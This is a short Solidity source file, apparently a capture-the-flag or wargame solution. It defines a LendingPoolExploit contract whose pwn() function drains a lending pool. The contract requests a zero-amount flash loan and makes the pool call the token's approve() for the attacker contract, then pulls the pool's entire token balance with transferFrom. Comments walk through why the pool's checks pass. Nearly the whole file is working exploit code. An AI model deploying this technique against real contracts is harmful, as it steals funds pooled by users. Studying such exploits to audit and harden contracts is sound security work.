// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface ILendingPool {
  function token() external view returns (address);

  function flashLoan(
    uint256 amount,
    address target,
    bytes calldata data
  ) external;
}

interface ILendingPoolToken {
  function balanceOf(address) external view returns (uint256);

  function approve(address, uint256) external returns (bool);

  function transferFrom(
    address,
    address,
    uint256
  ) external returns (bool);
}

contract LendingPoolExploit {
  ILendingPool public pool;
  ILendingPoolToken public token;

  constructor(address _pool) {
    pool = ILendingPool(_pool);
    token = ILendingPoolToken(pool.token());
  }

  function pwn() external {
    uint256 balance = token.balanceOf(address(pool));

    // The Lending Pool contract calls the token contract to approve
    // the exploit contract to spend it's ERC20 tokens.
    // No amount is borrowed, so the precondition & postcondition is met
    // The only state change during the flashLoan fn call is the approval
    // Once approved, it's trivial to transfer tokens whereever, as the explout
    // contract has permissions to spend all tokens.

    pool.flashLoan(
      0,
      address(token),
      abi.encodeWithSelector(token.approve.selector, address(this), balance)
    );

    token.transferFrom(address(pool), address(this), balance);
  }
}
